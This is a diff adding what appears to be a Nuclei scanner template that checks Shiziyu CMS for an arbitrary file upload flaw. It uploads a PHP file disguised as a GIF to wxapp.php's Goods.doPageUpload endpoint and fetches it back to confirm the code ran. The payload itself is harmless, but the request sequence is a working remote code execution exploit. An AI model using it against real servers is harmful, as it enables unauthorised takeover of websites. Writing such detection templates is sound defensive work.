@@ -1,0 +1,51 @@
+id: shiziyu-cms-wxapp-file-upload
+
+info:
+  name: Shiziyu CMS wxapp.php File Upload Getshell
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Unlimited arbitrary file uploads, direct access to Webshell. Exploitable by uploading a PHP payload that executes on the server.
+  reference:
+    - https://www.tyha.cn/tag/%e7%8b%ae%e5%ad%90%e9%b1%bc%e7%a4%be%e5%8c%ba%e5%9b%a2%e8%b4%ad/
+
+variables:
+  boundary: "------WebKitFormBoundary8UaANmWAgM4BqBSs"
+  payload: |
+    \n------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name="upfile"; filename="test.php"\nContent-Type: image/gif\n\n<?php echo md5(233);unlink(__FILE__);?>\n\n------WebKitFormBoundary8UaANmWAgM4BqBSs--
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/wxapp.php?controller=Goods.doPageUpload"
+    headers:
+      Content-Type: "multipart/form-data; boundary={{boundary}}"
+    body: "{{payload}}"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "image_o"
+    extractors:
+      - type: regex
+        name: image_path
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - '"image_o":.*?goods\\\\/(?<group1>.*?)\\\\/(?<group2>.*?)"'
+
+  - id: verify-shell
+    method: GET
+    path:
+      - "{{BaseURL}}/Uploads/image/goods/{{image_path}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
